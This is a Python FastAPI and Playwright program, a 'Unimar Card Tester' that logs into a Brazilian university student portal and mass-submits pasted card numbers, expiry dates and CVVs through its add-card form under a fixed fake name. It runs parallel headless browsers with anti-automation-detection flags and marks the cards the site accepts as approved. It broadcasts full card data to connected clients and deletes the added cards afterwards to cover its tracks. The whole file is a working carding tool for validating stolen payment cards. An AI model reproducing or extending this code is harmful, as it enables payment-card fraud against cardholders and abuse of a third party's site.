import asyncio
import os
import random
import time
from contextlib import asynccontextmanager
from pathlib import Path

import uvicorn
from fastapi import FastAPI, WebSocket, WebSocketDisconnect
from fastapi.responses import HTMLResponse
from pydantic import BaseModel

from playwright.async_api import async_playwright, TimeoutError as PlaywrightTimeoutError

# ===================== CONFIG =====================
URL_LOGIN = "https://digital.unimar.br/login"
URL_MEUS_CARTOES = "https://digital.unimar.br/areadoaluno/conta/meuscartoes"

EMAIL = os.getenv("UNIMAR_EMAIL")
SENHA = os.getenv("UNIMAR_SENHA")
NOME_FIXO = "Bruna Mendes"
SESSAO_PATH = "sessao_unimar.json"
SESSAO_MAX_AGE = 86400  # 24 horas

# Timeouts configuráveis
TIMEOUT_GOTO = 60000          # 60s para navegação
TIMEOUT_ELEMENTO = 15000      # 15s para encontrar elementos
TIMEOUT_DETECCAO = 60         # 60s máximo no loop de resultado
TIMEOUT_FAXINA = 15000        # 15s para operações de limpeza

# ===================== ESTADO =====================
estado = {
    "rodando": False,
    "cancelado": False,
    "clients": set(),
    "total_cartoes": 0,
    "processados": 0,
    "aprovados": 0,
    "fila_vazia": False,
    "tarefas_concluidas": 0,
    "inicio_timestamp": 0,
    "canais_ativos": 0,
}

def log(mensagem: str):
    timestamp = time.strftime("%H:%M:%S")
    full_msg = f"[{timestamp}] {mensagem}"
    print(full_msg)
    asyncio.create_task(broadcast("log", {"mensagem": full_msg}))

async def broadcast(type: str, data: dict = None):
    if data is None:
        data = {}
    message = {"type": type, **data}
    dead = set()
    for client in list(estado["clients"]):
        try:
            await client.send_json(message)
        except Exception:
            dead.add(client)
    estado["clients"] -= dead

# ===================== LIFESPAN =====================
@asynccontextmanager
async def lifespan(app: FastAPI):
    Path("aprovados.txt").touch(exist_ok=True)
    yield

app = FastAPI(title="Unimar Card Tester", lifespan=lifespan)

# ===================== WEBSOCKET =====================
async def heartbeat_task(websocket: WebSocket):
    try:
        while True:
            await asyncio.sleep(25)
            await websocket.send_json({"type": "ping"})
    except Exception:
        pass

@app.websocket("/ws")
async def websocket_endpoint(websocket: WebSocket):
    await websocket.accept()
    estado["clients"].add(websocket)

    try:
        await websocket.send_json({
            "type": "status",
            "rodando": estado["rodando"],
            "total": estado["total_cartoes"],
            "processados": estado["tarefas_concluidas"],
            "aprovados": estado["aprovados"],
            "canais_ativos": estado["canais_ativos"]
        })
    except Exception:
        estado["clients"].discard(websocket)
        return

    hb = asyncio.create_task(heartbeat_task(websocket))

    try:
        while True:
            data = await websocket.receive_json()
            if data.get("type") == "pong":
                continue
    except WebSocketDisconnect:
        pass
    except Exception:
        pass
    finally:
        hb.cancel()
        try:
            await hb
        except asyncio.CancelledError:
            pass
        estado["clients"].discard(websocket)

# ===================== FUNÇÕES AUXILIARES =====================

async def safe_goto(page, url: str, timeout: int = TIMEOUT_GOTO, retries: int = 3):
    """Navegação com retry automático e backoff exponencial."""
    for tentativa in range(1, retries + 1):
        try:
            await page.goto(url, wait_until="domcontentloaded", timeout=timeout)
            return True
        except PlaywrightTimeoutError:
            log(f"[Navegação] Timeout na tentativa {tentativa}/{retries} para {url}")
            if tentativa == retries:
                raise
            await asyncio.sleep(2 ** tentativa)  # 2s, 4s, 8s
    return False

async def safe_click(page, locator, timeout: int = TIMEOUT_ELEMENTO, force: bool = False):
    """Clique seguro com espera explícita e fallback."""
    try:
        await locator.wait_for(state="visible", timeout=timeout)
        await locator.click(force=force)
        return True
    except PlaywrightTimeoutError:
        log(f"[Clique] Elemento não ficou visível em {timeout}ms")
        return False

# ===================== SESSÃO & LOGIN =====================

async def sessao_e_valida(playwright) -> bool:
    """Testa rapidamente se a sessão salva ainda funciona."""
    sessao = Path(SESSAO_PATH)
    if not sessao.exists():
        return False
    if time.time() - sessao.stat().st_mtime > SESSAO_MAX_AGE:
        return False
    try:
        browser = await playwright.chromium.launch(
            headless=True,
            args=[
                "--no-sandbox",
                "--disable-dev-shm-usage",
                "--disable-gpu",
                "--disable-web-security",
                "--disable-features=IsolateOrigins,site-per-process",
                "--disable-blink-features=AutomationControlled",
            ]
        )
        context = await browser.new_context(
            viewport={"width": 1280, "height": 720},
            user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
        )
        page = await context.new_page()
        await safe_goto(page, URL_MEUS_CARTOES, timeout=15000)
        await asyncio.sleep(1.0)
        valida = await page.get_by_role("button", name="Adicionar Cartão de Crédito").count() > 0
        await context.close()
        await browser.close()
        return valida
    except Exception:
        return False

async def limpar_cartoes_antigos(page):
    """Faxina com timeout controlado e verificação ativa."""
    try:
        log("[Faxina] Iniciando limpeza...")
        await safe_goto(page, URL_MEUS_CARTOES)
        await asyncio.sleep(1.5)

        removidos = 0
        max_iteracoes = 50  # Proteção contra loop infinito

        for _ in range(max_iteracoes):
            if estado["cancelado"]:
                log("[Faxina] Cancelado pelo usuário.")
                break

            try:
                botao = page.get_by_role("button", name="Remover").first
                visivel = await botao.is_visible(timeout=3000)
            except Exception:
                break

            if not visivel:
                break

            await botao.click(force=True)
            await asyncio.sleep(0.8)

            confirm = page.get_by_role("button", name="Sim").or_(page.get_by_role("button", name="Confirmar"))
            try:
                await confirm.wait_for(state="visible", timeout=5000)
                await confirm.click(force=True)
                # Aguarda mudança no DOM ao invés de load_state
                await asyncio.sleep(1.0)
                removidos += 1
            except PlaywrightTimeoutError:
                log("[Faxina] Botão de confirmação não apareceu, prosseguindo...")
                break

        log(f"[Faxina] {removidos} cartão(ões) removido(s).")
    except Exception as e:
        log(f"[Faxina] Erro: {e}")

async def login_mestre(playwright):
    """Login com Modo Fast (reuse) e Modo Full (UI)."""
    try:
        # MODO FAST
        if await sessao_e_valida(playwright):
            log("[Autenticação] Sessão reutilizada (Modo Fast).")
            return True

        # MODO FULL
        log("[Autenticação] Login mestre (Modo Full)...")
        browser = await playwright.chromium.launch(
            headless=True,
            args=[
                "--no-sandbox",
                "--disable-dev-shm-usage",
                "--disable-gpu",
                "--disable-web-security",
                "--disable-features=IsolateOrigins,site-per-process",
                "--disable-blink-features=AutomationControlled",
            ]
        )
        context = await browser.new_context(
            viewport={"width": 1280, "height": 720},
            user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
        )
        page = await context.new_page()
        page.on("dialog", lambda dialog: asyncio.create_task(dialog.accept()))

        await safe_goto(page, URL_LOGIN)
        await page.get_by_role("textbox", name="E-mail ou CPF").fill(EMAIL)
        await page.get_by_role("textbox", name="Senha").fill(SENHA)
        await page.get_by_role("button", name="Entrar").click()

        # Aguarda redirecionamento com timeout generoso
        await page.wait_for_url("**/areadoaluno/**", timeout=60000)
        await page.wait_for_selector("text=Meus Cartões", timeout=30000)

        await limpar_cartoes_antigos(page)
        await context.storage_state(path=SESSAO_PATH)

        await context.close()
        await browser.close()
        log("[Autenticação] Login concluído!")
        return True
    except Exception as e:
        log(f"[ERRO] Login falhou: {e}")
        return False

# ===================== WORKER =====================

async def worker_contexto(id_worker: int, browser, fila: asyncio.Queue):
    """Worker com timeouts ajustados, retry e detecção robusta."""
    estado["canais_ativos"] += 1
    await broadcast("status", {"canais_ativos": estado["canais_ativos"]})

    context = None
    try:
        await asyncio.sleep(id_worker * 1.2)
        log(f"[Canal {id_worker}] Iniciando...")

        context = await browser.new_context(
            storage_state=SESSAO_PATH,
            viewport={"width": 1280, "height": 720},
            user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
        )
        page = await context.new_page()
        page.on("dialog", lambda dialog: asyncio.create_task(dialog.accept()))

        await safe_goto(page, URL_MEUS_CARTOES)
        await asyncio.sleep(1.0)

        while estado["rodando"] and not estado["cancelado"]:
            try:
                item = await asyncio.wait_for(fila.get(), timeout=3.0)
            except asyncio.TimeoutError:
                if fila.empty() and estado["tarefas_concluidas"] >= estado["total_cartoes"]:
                    break
                continue

            indice, linha, _ = item
            resultado = "timeout"

            try:
                partes = [x.strip() for x in linha.split("|")]
                if len(partes) != 4:
                    log(f"[Canal {id_worker}][Item {indice}] ❌ Formato inválido: {linha}")
                    fila.task_done()
                    estado["tarefas_concluidas"] += 1
                    await broadcast("reprovado", {"cartao": linha})
                    await broadcast("progresso", {
                        "processados": estado["tarefas_concluidas"],
                        "total": estado["total_cartoes"],
                        "aprovados": estado["aprovados"],
                    })
                    continue

                numero, mes, ano, cvv = partes
                log(f"[Canal {id_worker}][Item {indice}] ****{numero[-4:]}")

                # Navegação com retry
                await safe_goto(page, URL_MEUS_CARTOES)
                await asyncio.sleep(random.uniform(0.5, 1.2))

                # Tenta clicar em "Adicionar Cartão" com múltiplas estratégias
                btn_add = page.get_by_role("button", name="Adicionar Cartão de Crédito")
                
                clicou = False
                for tentativa in range(3):
                    try:
                        if await btn_add.is_visible(timeout=TIMEOUT_ELEMENTO):
                            await btn_add.click(force=True)
                            clicou = True
                            break
                    except Exception:
                        if tentativa == 0:
                            await page.evaluate("window.scrollTo(0, 0)")
                            await asyncio.sleep(0.5)
                        elif tentativa == 1:
                            # Tenta via JavaScript como último recurso
                            await page.evaluate("""() => {
                                const btn = Array.from(document.querySelectorAll('button'))
                                    .find(b => b.textContent.includes('Adicionar'));
                                if (btn) btn.click();
                            }""")
                            clicou = True
                            break
                        await asyncio.sleep(0.5)

                if not clicou:
                    log(f"[Canal {id_worker}][Item {indice}] ⚠️ Botão 'Adicionar' não encontrado")
                    resultado = "timeout"
                    raise PlaywrightTimeoutError("Botão Adicionar não encontrado")

                await asyncio.sleep(0.5)

                # Preenche formulário
                await page.get_by_role("textbox", name="Número do cartão").fill(numero)
                await page.get_by_role("textbox", name="Nome impresso no cartão").fill(NOME_FIXO)
                await page.get_by_label("Mês").select_option(mes)
                await page.get_by_label("Ano").select_option(ano)
                await page.get_by_role("textbox", name="CVV").fill(cvv)

                botoes_antes = await page.get_by_role("button", name="Remover").count()
                await page.get_by_role("button", name="Registrar Cartão de Crédito").click(force=True)

                # Loop de detecção melhorado (até 60s)
                inicio_loop = time.time()
                while time.time() - inicio_loop < TIMEOUT_DETECCAO:
                    if not estado["rodando"] or estado["cancelado"]:
                        resultado = "cancelado"
                        break

                    # Verifica se cartão foi adicionado (botão Remover aumentou)
                    try:
                        botoes_atual = await page.get_by_role("button", name="Remover").count()
                        if botoes_atual > botoes_antes:
                            resultado = "aprovado"
                            break
                    except Exception:
                        pass

                    # Verifica mensagens de erro no body
                    try:
                        body = await page.locator("body").inner_text()
                        body_lower = body.lower()
                        erros = ["inválida", "recusado", "erro", "não foi possível",
                                 "não autorizada", "recusada", "inválido", "tente novamente",
                                 "negado", "falhou", "invalid", "declined"]
                        if any(x in body_lower for x in erros):
                            resultado = "reprovado"
                            break
                    except Exception:
                        pass

                    # Verifica se apareceu algum toast/alert de sucesso
                    try:
                        sucesso = await page.locator("text=cartão adicionado").is_visible(timeout=500)
                        if sucesso:
                            resultado = "aprovado"
                            break
                    except Exception:
                        pass

                    await asyncio.sleep(0.5)

                if resultado == "timeout":
                    log(f"[Canal {id_worker}][Item {indice}] ⚠️ Timeout após {TIMEOUT_DETECCAO}s")

            except PlaywrightTimeoutError as e:
                log(f"[Canal {id_worker}][Item {indice}] ⏱️ Timeout: {e}")
                resultado = "timeout"
            except Exception as e:
                log(f"[Canal {id_worker}] Erro item {indice}: {e}")
                resultado = "erro"

            finally:
                # Broadcast do resultado
                if resultado == "aprovado":
                    log(f"[Canal {id_worker}][Item {indice}] ✅ APROVADO")
                    await broadcast("aprovado", {"cartao": f"{numero}|{mes}|{ano}|{cvv}"})
                    estado["aprovados"] += 1
                elif resultado == "reprovado":
                    log(f"[Canal {id_worker}][Item {indice}] ❌ Reprovado")
                    await broadcast("reprovado", {"cartao": f"{numero}|{mes}|{ano}|{cvv}"})
                elif resultado == "cancelado":
                    log(f"[Canal {id_worker}][Item {indice}] ⏹️ Cancelado")
                else:
                    log(f"[Canal {id_worker}][Item {indice}] ⚠️ {resultado.capitalize()}")
                    await broadcast("reprovado", {"cartao": f"{numero}|{mes}|{ano}|{cvv}"})

                fila.task_done()
                estado["tarefas_concluidas"] += 1

                elapsed = time.time() - estado["inicio_timestamp"] if estado["inicio_timestamp"] else 0
                velocidade = estado["tarefas_concluidas"] / (elapsed / 60) if elapsed > 0 else 0
                await broadcast("progresso", {
                    "processados": estado["tarefas_concluidas"],
                    "total": estado["total_cartoes"],
                    "aprovados": estado["aprovados"],
                    "velocidade": round(velocidade, 1),
                    "tempo": round(elapsed),
                })

    except Exception as e:
        log(f"[Canal {id_worker}] Erro geral: {e}")
    finally:
        if context:
            try:
                await context.close()
            except Exception:
                pass
        estado["canais_ativos"] -= 1
        await broadcast("status", {"canais_ativos": estado["canais_ativos"]})
        log(f"[Canal {id_worker}] Finalizado")

# ===================== PROCESSAMENTO =====================

async def processar_cartoes(texto_cartoes: str, num_canais: int):
    try:
        linhas = [l.strip() for l in texto_cartoes.splitlines() if l.strip()]
        linhas = list(dict.fromkeys(linhas))

        estado["total_cartoes"] = len(linhas)
        estado["processados"] = 0
        estado["aprovados"] = 0
        estado["tarefas_concluidas"] = 0
        estado["fila_vazia"] = False
        estado["cancelado"] = False
        estado["inicio_timestamp"] = time.time()
        estado["canais_ativos"] = 0

        if estado["total_cartoes"] == 0:
            log("[ERRO] Nenhum cartão fornecido.")
            return

        num_canais = min(max(num_canais, 1), 6)
        num_canais = min(num_canais, estado["total_cartoes"])

        log(f"[Sistema] {num_canais} canais | {estado['total_cartoes']} cartões")

        fila = asyncio.Queue()
        for idx, linha in enumerate(linhas, 1):
            await fila.put((idx, linha, 1))

        async with async_playwright() as pw:
            if not await login_mestre(pw):
                return

            browser = await pw.chromium.launch(
                headless=True,
                args=[
                    "--no-sandbox",
                    "--disable-dev-shm-usage",
                    "--disable-gpu",
                    "--disable-web-security",
                    "--disable-features=IsolateOrigins,site-per-process",
                    "--disable-blink-features=AutomationControlled",
                ]
            )
            tasks = [asyncio.create_task(worker_contexto(i, browser, fila)) for i in range(1, num_canais + 1)]
            await asyncio.gather(*tasks, return_exceptions=True)

            if estado["aprovados"] > 0 and not estado["cancelado"]:
                log("[Sistema] Faxina final...")
                try:
                    ctx = await browser.new_context(
                        storage_state=SESSAO_PATH,
                        viewport={"width": 1280, "height": 720},
                        user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
                    )
                    pg = await ctx.new_page()
                    pg.on("dialog", lambda dialog: asyncio.create_task(dialog.accept()))
                    await limpar_cartoes_antigos(pg)
                    await ctx.close()
                except Exception as e:
                    log(f"[Faxina Final] Erro: {e}")

            await browser.close()

    except Exception as e:
        log(f"[ERRO CRÍTICO] {e}")
    finally:
        estado["rodando"] = False
        estado["cancelado"] = False
        estado["canais_ativos"] = 0
        log("[Sistema] Processamento concluído")
        await broadcast("status", {"rodando": False, "canais_ativos": 0})

# ===================== ROTAS =====================
class IniciarRequest(BaseModel):
    lista: str
    canais: int = 4

@app.post("/api/iniciar")
async def iniciar(data: IniciarRequest):
    if estado["rodando"]:
        return {"status": "já_em_execucao"}
    estado["rodando"] = True
    estado["cancelado"] = False
    await broadcast("status", {"rodando": True})
    asyncio.create_task(processar_cartoes(data.lista, data.canais))
    return {"status": "iniciado"}

@app.post("/api/parar")
async def parar():
    estado["rodando"] = False
    estado["cancelado"] = True
    log("⛔ Interrupção solicitada.")
    await broadcast("status", {"rodando": False})
    return {"status": "parando"}

@app.get("/", response_class=HTMLResponse)
async def index():
    with open("templates/index.html", encoding="utf-8") as f:
        return f.read()

@app.get("/api/status")
async def get_status():
    elapsed = time.time() - estado["inicio_timestamp"] if estado["inicio_timestamp"] else 0
    velocidade = estado["tarefas_concluidas"] / (elapsed / 60) if elapsed > 0 else 0
    return {
        "rodando": estado["rodando"],
        "cancelado": estado["cancelado"],
        "total": estado["total_cartoes"],
        "processados": estado["tarefas_concluidas"],
        "aprovados": estado["aprovados"],
        "canais_ativos": estado["canais_ativos"],
        "velocidade": round(velocidade, 1),
        "tempo": round(elapsed),
    }

if __name__ == "__main__":
    uvicorn.run("main:app", host="0.0.0.0", port=5000)
